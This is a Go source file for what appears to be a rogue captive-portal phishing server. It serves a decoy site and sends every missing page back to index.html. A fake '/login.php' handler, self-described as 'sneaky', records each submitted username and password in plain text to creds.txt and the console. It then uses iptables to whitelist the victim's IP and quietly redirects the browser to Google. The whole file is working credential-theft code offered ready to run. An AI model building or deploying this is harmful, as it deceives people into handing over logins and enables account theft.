package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)
type NotFoundRedirectRespWr struct {
    http.ResponseWriter // We embed http.ResponseWriter
    status              int
}

func (w *NotFoundRedirectRespWr) WriteHeader(status int) {
    w.status = status // Store the status for our own use
    if status != http.StatusNotFound {
        w.ResponseWriter.WriteHeader(status)
    }
}

func (w *NotFoundRedirectRespWr) Write(p []byte) (int, error) {
    if w.status != http.StatusNotFound {
        return w.ResponseWriter.Write(p)
    }
    return len(p), nil // Lie that we successfully written it
}

func login(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	ip := strings.Split(r.RemoteAddr, ":")[0]

	username := r.Form.Get("username")
	password := r.Form.Get("password")

	if username == "" || username == "username" ||
		password == "" || password == "password" {
		return
	}

	/* iptables whitelist */
	cmd := exec.Command("iptables", "-t", "nat", "-I", "GOBWEB", "-s", ip, "-j", "RETURN")
	_, err := cmd.Output()

	if err != nil {
		fmt.Printf("[+] iptables whitelist error!\n")
		panic(err)
	}

	fo, err := os.OpenFile("creds.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0666)
	defer fo.Close()

	if err != nil {
		fmt.Printf("[+] file open error!\n")
		panic(err)
	}

	fo.WriteString(username + ":" + password + "\n")

	fmt.Printf("[+] username: %v password %v\n", username, password)

	fmt.Fprint(w, "<script> setTimeout(function() { window.location.replace(\"http://google.com\"); }, 3000) </script>")
}

func wrapHandler(h http.Handler) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        nfrw := &NotFoundRedirectRespWr{ResponseWriter: w}
        h.ServeHTTP(nfrw, r)
        if nfrw.status == 404 {
            log.Printf("Redirecting %s to index.html.", r.RequestURI)
            http.Redirect(w, r, "/index.html", http.StatusFound)
        }
    }
}

func main() {
	log.Println("gobweb started")
	fs := wrapHandler(http.FileServer(http.Dir("site/")))
	//http.Handle("/", http.FileServer(http.Dir("site/")))
	http.Handle("/", fs)

	/* Aren't I sneaky */
	http.HandleFunc("/login.php", login)
	log.Fatal(http.ListenAndServe(":80", nil))
}
